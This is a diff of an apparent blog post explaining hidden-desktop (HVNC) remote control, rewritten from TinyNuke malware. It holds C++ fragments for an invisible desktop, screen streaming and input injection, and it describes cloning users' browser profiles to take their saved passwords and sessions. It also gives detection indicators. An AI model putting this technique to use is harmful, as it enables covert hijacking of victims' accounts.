@@ -6,7 +6,9 @@ export const metadata = {
 
 # Notes on Hidden Desktop
 
-Windows supports multiple desktop objects per session. The visible desktop is just one of them. You can create another that runs in parallel without showing anything on the user's screen.
+I rewrote TinyNuke's HVNC module as a standalone client-server and figured I'd write up some notes on how it works, broadly.
+
+Windows supports multiple desktop objects per session, and the visible desktop is just one of them. You can create another that runs in parallel, invisible to the user.
 
 ```cpp
 HDESK hDesk = CreateDesktopA("HiddenDesktop", NULL, NULL, 0, GENERIC_ALL, NULL);
@@ -28,11 +30,11 @@ Two threads do everything:
 - **Desktop Thread**: Captures frames from the hidden desktop and streams them to the server
 - **Input Thread**: Receives mouse/keyboard events from the server and posts them to windows on the hidden desktop
 
-Both connect to the same server socket. Handshake is 7 bytes "MELTED\0" followed by 4-byte connection type (0 for desktop thread, 1 for input thread).
+Both connect to the same server socket. Handshake is 7 bytes `MELTED\0` followed by 4-byte connection type (0 for desktop thread, 1 for input thread).
 
 ## Screen Capture
 
-Using `BitBlt` on the desktop DC only gets what's currently visible on top. Minimized or obscured windows don't show up. Better to enumerate windows individually:
+Using `BitBlt` on the desktop DC only gets what's currently visible on top, so minimized or obscured windows don't show up. Better to enumerate windows individually:
 
 ```cpp
 HWND hWnd = GetTopWindow(NULL);
@@ -41,7 +43,6 @@ hWnd = GetWindow(hWnd, GW_HWNDLAST);
 while (hWnd != NULL) {
     if (IsWindowVisible(hWnd)) {
         GetWindowRect(hWnd, &rect);
-        // PrintWindow captures window content even if minimized
         PrintWindow(hWnd, hDcWindow, 0);
 BitBlt(hDcScreen, rect.left, rect.top, 
                rect.right - rect.left, rect.bottom - rect.top,
@@ -60,7 +61,6 @@ for (DWORD i = 0; i < imageSize; i += 3) {
     if (pixels[i] == oldPixels[i] && 
         pixels[i+1] == oldPixels[i+1] && 
         pixels[i+2] == oldPixels[i+2]) {
-        // Mark unchanged pixels with specific color
         pixels[i] = 255;
 pixels[i+1] = 174;
         pixels[i+2] = 201;
@@ -68,7 +68,7 @@ pixels[i+1] = 174;
 }
 ```
 
-Unchanged pixels become RGB(255, 174, 201). The server knows to skip these. If every pixel matches, send 0 to the server and skip transmission entirely. Compress the result with `RtlCompressBuffer()` using LZNT1 format before sending.
+Unchanged pixels get marked as RGB(255, 174, 201) so the server skips them. If every pixel matches, send 0 and skip transmission entirely. Compress with `RtlCompressBuffer()` using LZNT1 before sending.
 
 ## Input Routing
 
@@ -100,7 +100,6 @@ For window dragging, check `WM_NCHITTEST` to see if the mouse is on the title ba
 ```cpp
 LRESULT hitTest = SendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
 if (hitTest == HTCAPTION) {
-    // Dragging title bar - move entire window
     int moveX = lastPoint.x - currentPoint.x;
 int moveY = lastPoint.y - currentPoint.y;
     MoveWindow(hWnd, x - moveX, y - moveY, width, height, FALSE);
@@ -109,11 +108,11 @@ int moveY = lastPoint.y - currentPoint.y;
 
 ## Browser Profile Cloning
 
-The key feature: clone the user's browser profile before launching so you get their saved passwords and active sessions.
+Before launching a browser on the hidden desktop, you clone the user's profile to get their saved passwords and active sessions.
 
-**Chrome**: Copy %LOCALAPPDATA%\Google\Chrome\User Data\Default to a new directory
+**Chrome**: Copy `%LOCALAPPDATA%\Google\Chrome\User Data\Default` to a new directory
 
-**Firefox**: Parse %APPDATA%\Mozilla\Firefox\profiles.ini to find the profile path, then copy that directory
+**Firefox**: Parse `%APPDATA%\Mozilla\Firefox\profiles.ini` to find the profile path, then copy that directory
 
 Launch the browser pointing to the cloned profile:
 
@@ -127,10 +126,8 @@ si.lpDesktop = "HiddenDesktop";
 CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 ```
 
-Browser sees it as a legitimate profile. No warnings. Everything just works including saved passwords, cookies, and active login sessions.
-
 ## Detection
 
-Detection is difficult because most standard tools focus on the visible desktop. Task Manager won't show the desktop assignment, though Process Explorer's Environment tab and Sysinternals Desktops.exe can reveal the hidden object. Indicators include multiple explorer.exe instances, browsers launching with non-standard user data paths, or simultaneous network connections to the same IP. EDR telemetry often lacks visibility into thread-specific desktop assignments, leaving this specific object boundary unmonitored.
+Most standard tools are scoped to the visible desktop, including Task Manager, which won't show the desktop assignment at all. Process Explorer's Environment tab or Sysinternals Desktops.exe can surface it. More telling signs are multiple explorer.exe instances, browsers with unusual user data paths, or simultaneous connections to the same IP. Most EDR agents don't track desktop assignments at the thread level, so this tends to go unnoticed.
 
 Source code at: [github.com/Meltedd/HVNC](https://github.com/Meltedd/HVNC)
